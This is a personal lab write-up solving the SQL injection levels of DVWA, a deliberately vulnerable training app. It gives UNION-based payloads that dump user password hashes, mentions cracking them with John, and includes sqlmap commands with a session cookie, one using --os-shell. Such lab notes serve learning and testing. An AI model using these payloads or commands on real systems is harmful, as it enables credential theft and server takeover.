## Low
- For low we realised id parameter (GET) was vulnerable and could be easily injected.
```
a' UNION SELECT "lol", @@VERSION ; -- -
a' UNION SELECT "lol", @@VERSION ; -- #
```
- This payload easily worked.
- `a' UNION SELECT first_name, password from users; -- -` this one gave me passwords for all users
- ![[Pasted image 20210213092928.png]]
- To crack MD5 hash using John
	- ![[Pasted image 20210213102002.png]]
- Next thing I tired was **sqlmap**
- To find injectable parameter 
`sqlmap -u "http://192.168.0.105/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low;PHP  
SESSID=g832d5mrsta7pm9c1hug0bj8io"`
- To get shell
`sqlmap -u "http://192.168.0.105/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low;PHP  
SESSID=g832d5mrsta7pm9c1hug0bj8io" --os-shell`

## Medium
- Here we had `mysqli_real_escape_string` trying to sanitize the input. However this could be easily bypassed.
- Consider the following query:

```
$iId = mysql_real_escape_string("1 OR 1=1");    
$sSql = "SELECT * FROM table WHERE id = $iId";
```

`mysql_real_escape_string()` will not protect you against this. **The fact that you use single quotes (`' '`) around your variables inside your query is what protects you against this.** The following is also an option:

```
$iId = (int)"1 OR 1=1";
$sSql = "SELECT * FROM table WHERE id = $iId";
```
- My payload : `1 OR 1=1 UNION SELECT first_name, password from users;-- -`
- ![[Pasted image 20210213103145.png]]


## High 
- Here instead of GET request parameters they used Session variables. Well same thing as low to be honest. Same payload worked ez pz.
- `a' UNION SELECT first_name, password from users; -- -`
- ![[Pasted image 20210213111511.png]]
